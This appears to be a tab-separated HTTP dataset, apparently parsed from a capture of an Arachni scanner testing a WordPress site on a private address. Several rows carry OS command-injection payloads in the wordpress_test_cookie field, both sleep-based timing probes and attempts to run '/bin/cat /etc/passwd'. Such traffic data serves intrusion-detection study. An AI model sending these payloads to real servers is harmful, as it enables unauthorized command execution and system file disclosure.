http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie='+%3B+sleep+0+%3B+'	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie='+%3B+sleep+8+%3B+'	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie='+|+sleep+0+|+'	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie='+|+sleep+8+|+'	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie='+%26%26+sleep+0+%26%26+'	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie='+%26%26+sleep+8+%26%26+'	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie='+%26+sleep+0+%26+'	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie='+%26+sleep+8+%26+'	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=+%3B+sleep+0+%3B+	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=+%3B+sleep+8+%3B+	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=+|+sleep+0+|+	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=+|+sleep+8+|+	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=+%26%26+sleep+0+%26%26+	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=+%26%26+sleep+8+%26%26+	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=+%26+sleep+0+%26+	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=+%26+sleep+8+%26+	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=sleep+0	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=sleep+8	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/index.php%5C/pagina-ejemplo%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=5.9		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/css/dashicons.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=5.9		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/css/dashicons.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/css/buttons.min.css?ver=5.9		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/css/buttons.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/css/buttons.min.css?ver=5.9		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/css/buttons.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									19692						1	http://192.168.1.102/web/wp-admin/css/forms.min.css?ver=5.9		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-admin/css/forms.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									19693						1	http://192.168.1.102/web/wp-admin/css/forms.min.css?ver=5.9		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-admin/css/forms.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									19690						1	http://192.168.1.102/web/wp-admin/css/l10n.min.css?ver=5.9		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-admin/css/l10n.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									19691						1	http://192.168.1.102/web/wp-admin/css/l10n.min.css?ver=5.9		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-admin/css/l10n.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-admin/css/login.min.css?ver=5.9		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-admin/css/login.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									19743						1	http://192.168.1.102/web/wp-admin/css/login.min.css?ver=5.9		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-admin/css/login.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									19753						1	http://192.168.1.102/web/wp-login.php		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-login.php
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									19744						1	http://192.168.1.102/web/wp-login.php		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-login.php
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									19733						1	http://192.168.1.102/web/wp-login.php?action=lostpassword		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-login.php?action=lostpassword
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									19735						1	http://192.168.1.102/web/wp-login.php?action=lostpassword		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-login.php?action=lostpassword
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									19750						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery.min.js?ver=3.6.0		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery.min.js?ver=3.6.0
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery.min.js?ver=3.6.0		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery.min.js?ver=3.6.0
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/zxcvbn-async.min.js?ver=1.0		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/zxcvbn-async.min.js?ver=1.0
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/zxcvbn-async.min.js?ver=1.0		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/zxcvbn-async.min.js?ver=1.0
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/bin/cat+/etc/passwd	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									19784						1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=+%26%26+/bin/cat+/etc/passwd+%26%26+	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									19795						1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=+|+/bin/cat+/etc/passwd+|+	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									19796						1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=+%3B+/bin/cat+/etc/passwd+%3B+	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									19797						1	http://192.168.1.102/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie='+%26%26+/bin/cat+/etc/passwd+%26%26+'	/web/index.php/wp-json/wp/v2/pages/%5C%22http:%5C/%5C/192.168.1.102%5C/web%5C/wp-admin%5C/%5C%22
